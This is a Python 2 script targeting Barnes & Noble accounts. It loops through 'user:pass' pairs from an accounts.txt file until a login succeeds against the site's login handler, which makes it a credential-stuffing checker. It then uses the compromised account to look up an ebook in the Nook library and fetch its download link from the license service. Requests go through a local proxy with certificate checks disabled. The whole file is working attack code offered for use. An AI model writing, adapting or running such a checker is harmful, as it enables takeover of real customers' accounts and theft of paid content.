# -*- coding: utf-8 -*-
import requests
import codecs
import random
import re

requests.packages.urllib3.disable_warnings()


def check(user, passw):
    try:
        s = requests.session()
        proxy = {
                 'http': '127.0.0.1:8888',
                 'https': '127.0.0.1:8888'
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
            'Accept-Encoding': 'gzip'
        }
        r = s.get(
                    'http://www.barnesandnoble.com/',
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        r = s.get(
                    'http://www.barnesandnoble.com/account/login-frame.jsp?tplName=login&parentUrl=http%3a%2f%2fwww.barnesandnoble.com%2f&isCheckout=&isNookLogin=&isEgift=',
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://www.barnesandnoble.com/account/login-frame.jsp?tplName=login&parentUrl=https%3a%2f%2fwww.barnesandnoble.com%2faccount%2f%3fDPSLogout%3dtrue&isCheckout=&isNookLogin=&isEgift='
        }
        r = s.post(
                    'https://www.barnesandnoble.com/xhr/handler.jsp?_DARGS=/account/login-frame.jsp',
                    '_dyncharset=UTF-8&_dynSessConf=-1582949255614872703&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.login={0}&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.login=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.password={1}&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.password=+&amplifiHandler=%2Fatg%2Fuserprofiling%2FProfileFormHandler.login&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.autoLogin=true&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.autoLogin=+&getData=profile&%2Fatg%2Fuserprofiling%2FProfileFormHandler.eGiftLogin=&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.eGiftLogin=+&_DARGS=%2Faccount%2Flogin-frame.jsp'.format(user, passw),
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        if '"success": true' in r.text:
            return True
        else:
            return False
    except Exception, e:
        print e


def getID(user, passw, book):
    try:
        s = requests.session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
            'Accept-Encoding': 'gzip'
        }
        proxy = {
                 'http': '127.0.0.1:8888',
                 'https': '127.0.0.1:8888'
        }
        r = s.get(
                    'http://www.barnesandnoble.com/',
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        r = s.get(
                    'http://www.barnesandnoble.com/account/login-frame.jsp?tplName=login&parentUrl=http%3a%2f%2fwww.barnesandnoble.com%2f&isCheckout=&isNookLogin=&isEgift=',
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
            'Accept-Encoding': 'gzip',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = s.post(
                    'https://www.barnesandnoble.com/xhr/handler.jsp?_DARGS=/account/login-frame.jsp',
                    '_dyncharset=UTF-8&_dynSessConf=-1582949255614872703&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.login={0}&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.login=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.password={1}&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.password=+&amplifiHandler=%2Fatg%2Fuserprofiling%2FProfileFormHandler.login&%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.autoLogin=true&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.value.autoLogin=+&getData=profile&%2Fatg%2Fuserprofiling%2FProfileFormHandler.eGiftLogin=&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.eGiftLogin=+&_DARGS=%2Faccount%2Flogin-frame.jsp'.format(user, passw),
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        if '"success": true' in r.text:
            r = s.get(
                    'https://nook.barnesandnoble.com/my_library/ebook',
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
            id = re.findall("/my_library/library_items/(.*?)/confirm_delete\?ean={0}".format(book), r.text)[0]
            print id
            return id
        else:
            return False
    except Exception, e:
        print e

def down(user, passw, id):
    try:
        s = requests.session()
        headers = {
            'User-Agent': 'BN ClientAPI CPP/1.0.1.1013 (BN;windows;2.5.6.9575;P001000007)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        proxy = {
                 'http': '127.0.0.1:8888',
                 'https': '127.0.0.1:8888'
        }
        r = s.post(
                    'https://cart4.barnesandnoble.com/services/service.aspx',
                    'UIAction=signin&acctPassword={1}&emailAddress={0}&outFormat=0&schema=1&service=1&stage=signIn'.format(user, passw),
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        r = s.get(
                    'http://edelivery.barnesandnoble.com/EDS/LicenseService.svc/GetLicense2/{0}/ePub'.format(id),
                    verify=False,
                    headers=headers,
                    proxies=proxy
                )
        url = re.findall("<eBookUrl>(.*?)</eBookUrl>", r.text)[0]
        if url:
            print url
        else:
            return False
    except Exception, e:
        print e

def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
    
    work = False
    acc = random.choice(users)
    while not work:
        if check(acc.split(':')[0].strip(), acc.split(':')[1].strip()):
            work = True
        else:
            acc = random.choice(users)
    
    id = getID(acc.split(':')[0].strip(), acc.split(':')[1].strip(), '9780446535533')
    if id:
        down(acc.split(':')[0].strip(), acc.split(':')[1].strip(), id)
if __name__ == '__main__':
    main()
        